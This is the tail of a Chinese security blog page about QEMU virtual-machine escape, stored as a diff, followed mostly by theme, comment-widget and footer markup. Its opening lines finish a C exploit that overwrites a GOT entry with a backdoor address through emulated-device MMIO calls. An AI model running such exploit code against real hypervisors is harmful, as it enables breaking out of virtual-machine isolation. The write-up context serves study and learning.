+    <span class="token function">mmio_edit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>free_got<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_edit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_malloc</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x360</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_malloc</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x360</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_edit</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>backdoor_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_edit</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token function">mmio_free</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/29.png"></div>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力!</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.bmp" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.bmp" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone, qq, weibo, douban"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+            
+            
+            <div class="reprint1">
+                <p>
+                    <span class="reprint1-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;Reprint policy:
+                    </span>
+                    <a href="http://xiaoxin.zone" class="b-link-green">xiaoxin</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2021/06/23/chu-tan-qemu-tao-yi/" class="b-link-green">初探qemu逃逸</a>
+                </p>
+            </div>
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'XXXXXXXXXXXXXXXXXXXXXXXXXXXX',
+        clientSecret: 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX',
+        repo: 'bluesheepyang.github.io',
+        owner: 'bluesheepyang',
+        admin: ["bluesheepyang"],
+        id: '2021/06/23/chu-tan-qemu-tao-yi/',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+    /* valine 评论框增加背景图片 */
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("") 100% 100% no-repeat;
+    }
+
+    #vcomments input[type=text],
+    #vcomments input[type=email],
+    #vcomments input[type=url],
+    #vcomments textarea {
+        box-sizing: border-box;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #42b983;
+        font-weight: 500;
+        text-decoration: underline;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    /* 修复评论第一行位置错位 */
+    .v .vlist .vcard {
+    padding-top: 2.5em !important ;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div id="vcomments" class="card-content"></div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<!-- <link rel="stylesheet" type="text/css" href="/libs//libs/jQuery-emoji/dist/css/jquery.emoji.css">
+<script src="/libs//libs/jQuery-emoji/dist/js/jquery.emoji.min.js"></script>
+<script src="/libs//libs/jQuery-emoji/dist/js/emoji.list.js"></script> -->
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'XXXXXXXXXXXXXXXXXXXXXXXX',
+        appKey: 'XXXXXXXXXXXXXXXXXXXXXX',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'en',
+        placeholder: 'just go go',
+
+    });
+
+//     function parse_emoji() {
+//     jQuery(".vcontent").emojiParse({
+//       basePath: '/libs/jQuery-emoji/images/emoji',
+//       icons: emojiLists   // 注：详见 js/emoji.list.js
+//     });
+//   }
+  
+//   setTimeout(function() {
+//     // jQuery emoji 解析
+//     parse_emoji();
+//     // jquery emoji 初始化
+//     jQuery(".veditor").emoji({
+//       showTab: true,
+//       animation: 'slide',
+//       basePath: '/libs/jQuery-emoji/images/emoji',
+//       icons: emojiLists  // 注：详见 js/emoji.list.js
+//     });
+//     jQuery(".vmore").on("click", function() {
+//       setTimeout(function() {
+//         parse_emoji();
+//       }, 500);
+//     });
+//   }, 800)
+
+</script>
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2021/06/23/cve-2015-4852-ji-qian-zhi-zhi-shi-fava-fan-xu-lie-hua-cc1-li-yong-lian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="CVE-2015-4852及前置知识fava反序列化CC1利用链">
+                        
+                        <span class="card-title">CVE-2015-4852及前置知识fava反序列化CC1利用链</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            环境搭建WebLogic是美商Oracle的主要产品之一，系购并得来。是商业市场上主要的Java应用服务器软件之一，是世界上第一个成功商业化的J2EE应用服务器
+搭建环境相比较之前的服务器更加复杂
+安装weblogic参考
+下载Weblog
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-06-23
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java反序列化/" class="post-category" target="_blank">
+                                    Java反序列化
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/06/22/java-fan-xu-lie-hua-ru-men/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="java反序列化总结">
+                        
+                        <span class="card-title">java反序列化总结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言本篇文章初步学习java反序列化以及反序列化利用需要掌握的java反射机制，文章内容借鉴多篇前人文章，总结仅供学习和参考
+java反序列化入门（一）初识JAVA反序列化漏洞0x0 java序列化与反序列化0x00 简单介绍Java 序列
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-06-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java反序列化/" class="post-category" target="_blank">
+                                    Java反序列化
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: xiaoxin<br />'
+            + 'Author: Shinnosuke<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4, h5'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+        <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&copy; 2020 小羊. 
+
+            <br>
+            <span id="sitetime"></span><span class="my-face">ღゝ◡╹)ノ♡</span>
+            <br>
+
+            
+
+            
+                    
+                        <span id="busuanzi_container_site_pv" style='display:none'></span>
+                        总访问量: <span id="busuanzi_value_site_pv" class="white-color"></span>
+                    
+        
+                    
+                        <span id="busuanzi_container_site_uv" style='display:none'></span>
+                        人次&nbsp; | &nbsp;访客人数: <span id="busuanzi_value_site_uv" class="white-color"></span> 人
+                    
+    
+            
+
+            
+                &nbsp; | &nbsp;字数统计:&nbsp;
+                <span class="white-color">143.5k</span> 字
+            
+
+            
+            <br>
+
+        </div>
+
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/bluesheepyang" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+ 
+    <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1395428693@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+
+    <a href="https://zhihu.com/people/xxxxx" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
+        <i class="fa fa-inverse">知</i>
+    </a>
+
+
+
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=1395428693&site=qq&menu=yes" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="https://weibo.com/xxxxx" class="tooltipped" target="_blank" data-tooltip="关注我的微博" data-position="top" data-delay="50">
+        <i class="fa fa-weibo"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+
+        var t1 = Date.UTC(2020, 07, 23, 00, 00, 00); //北京时间2020-7-23 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes *
+            minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已勉强运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours +
+            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒" ;
+    } /*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+
+
+
+
+
+        <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+        <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+        <script src="https://cdn.bootcss.com/materialize/1.0.0/js/materialize.min.js"></script>
+        <script src="https://cdn.bootcss.com/masonry/4.2.2/masonry.pkgd.min.js"></script>
+        <script src="https://cdn.bootcss.com/aos/3.0.0-beta.6/aos.js"></script>
+        <script src="https://cdn.bootcss.com/scrollprogress/3.0.2/scrollProgress.min.js"></script>
+        <script src="https://cdn.bootcss.com/lightgallery/1.6.12/js/lightgallery-all.min.js"></script>
+        <script src="/js/matery.js"></script>
+
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+        
+            <script src="/libs/others/clicklove.js"></script>
+        
+
+        
+            <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+
+        <!-- 洪卫 shw2018 add 2019.08.28 -->
+        <script type="text/javascript">
+            var OriginTitile = document.title,
+                st;
+            document.addEventListener("visibilitychange", function () {
+                document.hidden ? (document.title = "饮水思源，笃定前行~", clearTimeout(st)) : (document.title =
+                    "(๑•̀ㅂ•́) ✧被发现了～", st = setTimeout(function () {
+                        document.title = OriginTitile
+                    }, 3e3))
+            })
+        </script>
+
+        <!-- 鼠标点击烟花爆炸效果  洪卫 shw2018 add 2019.09.09 -->
+        
+            <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 1; pointer-events: none;"></canvas>
+            <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+            <script type="text/javascript" src="/js/fireworks.js"></script>
+        
+
+        <!-- 背景雪花飘落特效洪卫 shw2018 add 2019.09.10 -->
+        
+            <script type="text/javascript">
+            //只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+            }
+            </script>
+        
+
+        <!-- 鼠标点击文字特效 洪卫 shw2018 add 2019.09.10-->
+        
+            <script src="/js/wenzi.js" type="text/javascript"></script>
+        
+
+        <!-- 背景雪花飘落特效 洪卫 shw2018 add 2019.09.10 -->
+        
+            <script type="text/javascript">
+                var windowWidth = $(window).width();
+                if (windowWidth > 768) {
+                    document.write('<script type="text/javascript" src="/js/xuehuapiaoluo.js"><\/script>');
+                }
+            </script>
+        
+
+        <!-- 在线聊天工具  洪卫 shw2018 add 2019.09.11 -->
+        
+            <script src="//code.tidio.co/xxxxxxxxxxxxxxxxxxxxxxxxxxx.js"></script>
+            <!--  在线聊天位置自定义  洪卫 shw2018 add 2019.09.13  -->
+            <script> 
+                $(document).ready(function () {
+
+                    setInterval(change_Tidio, 50);  
+                    function change_Tidio() { 
+
+                        var tidio=$("#tidio-chat iframe");
+                        if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"80px":"20px";   
+                            document.getElementById("tidio-chat-iframe").style.right="-15px";   
+                            document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        } 
+                        else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;   
+                            document.getElementById("tidio-chat-iframe").style.right="-15px"; 
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        }
+                        else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;   
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        }
+
+                        if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                            document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                        }
+                    } 
+                }); 
+            </script>
+        
+
+        <!-- 背景 canvas-nest  洪卫 shw 2018  add 2019.09.15-->
+        
+            <script type="text/javascript">
+            var windowWidth = $(window).width();
+            if (windowWidth > 992) {
+                document.write('<script type="text/javascript" color="0,0,255" pointColor="0,0,255" opacity= "0.8" zIndex="--1" count="150"src="/libs/background/canvas-nest.js"><\/script>');
+            }
+            </script>
+        
+
+        <!-- 背景静止彩带  洪卫 shw 2018  add 2019.09.15-->
+        
+
+        <!-- 背景动态彩带 洪卫 shw 2018  add 2019.09.15-->
+        
+            <script type="text/javascript">
+            var windowWidth = $(window).width();
+            if (windowWidth > 992) {
+                document.write('<script type="text/javascript" src="/libs/background/ribbon-dynamic.js"><\/script>');
+            }
+            </script>
+        
+
